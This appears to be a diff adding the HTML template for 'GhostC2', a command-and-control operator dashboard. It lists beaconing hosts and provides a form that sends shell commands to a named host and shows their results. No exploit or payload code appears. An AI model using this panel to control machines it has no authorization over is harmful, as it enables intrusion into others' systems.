@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>GhostC2 Dashboard</title>
+    <style>
+        body { background: #111; color: #0f0; font-family: monospace; padding: 20px; }
+        h1, h2 { color: #0f0; }
+        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
+        th, td { border: 1px solid #0f0; padding: 8px; text-align: left; }
+        th { background-color: #222; }
+        input, select, button {
+            background: #222;
+            color: #0f0;
+            border: 1px solid #0f0;
+            padding: 5px;
+            font-family: monospace;
+        }
+        .form-section { margin-top: 40px; }
+    </style>
+</head>
+<body>
+    <h1>👻 GhostC2 Beacon Dashboard</h1>
+
+    <table>
+        <tr>
+            <th>ID</th>
+            <th>IP</th>
+            <th>Hostname</th>
+            <th>Timestamp (UTC)</th>
+            <th>Payload</th>
+        </tr>
+        {% for beacon in beacons %}
+        <tr>
+            <td>{{ beacon[0] }}</td>
+            <td>{{ beacon[1] }}</td>
+            <td>{{ beacon[2] }}</td>
+            <td>{{ beacon[3] }}</td>
+            <td>{{ beacon[4] }}</td>
+        </tr>
+        {% endfor %}
+    </table>
+
+   <div class="form-section">
+        <h2>Add New Task</h2>
+        <form method="POST" action="/add_task">
+            Hostname: <input type="text" name="hostname" required><br><br>
+            Command: <input type="text" name="command" required><br><br>
+            <button type="submit">Send Task</button>
+        </form>
+    </div>
+
+    
+    <div class="form-section">
+    <h2>Task History</h2>
+    <table>
+        <tr>
+            <th>ID</th>
+            <th>Hostname</th>
+            <th>Command</th>
+            <th>Status</th>
+            <th>Result</th>
+        </tr>
+        {% for task in tasks %}
+        <tr>
+            <td>{{ task[0] }}</td>
+            <td>{{ task[1] }}</td>
+            <td>{{ task[2] }}</td>
+            <td>{{ task[3] }}</td>
+            <td><pre>{{ task[4] }}</pre></td>
+        </tr>
+        {% endfor %}
+    </table>
+    </div>
+
+    <script>
+        setTimeout(function() {
+            window.location.reload();
+        }, 5000); // Refresh every 5 seconds
+    </script>
+    
+</body>
+</html>
